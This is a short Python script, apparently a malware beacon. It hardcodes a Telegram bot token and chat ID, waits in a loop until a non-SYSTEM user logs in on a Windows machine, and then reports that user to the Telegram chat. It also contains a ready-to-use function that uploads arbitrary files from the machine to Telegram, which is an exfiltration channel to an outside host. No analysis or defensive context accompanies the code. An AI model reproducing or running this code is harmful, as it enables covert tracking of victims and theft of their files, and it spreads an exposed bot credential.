#don't delete
import requests
import subprocess
import os
import tempfile
import importlib.util
import string
import time
import sys

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def is_user_logged_in():
    output = subprocess.check_output(["echo", "%username%"], shell=True, text=True).strip()
    if "SYSTEM" in output:
        return False, output
    else:
        return True, output

while True:
    logged_in, output = is_user_logged_in()
    if logged_in:
        send_message(chat_id, token, "User logged.")
        os.system(f"msg * logged:{str(output)}")
        break
    else:
        time.sleep(5)
        os.system(f"msg * notlogged:{str(output)}")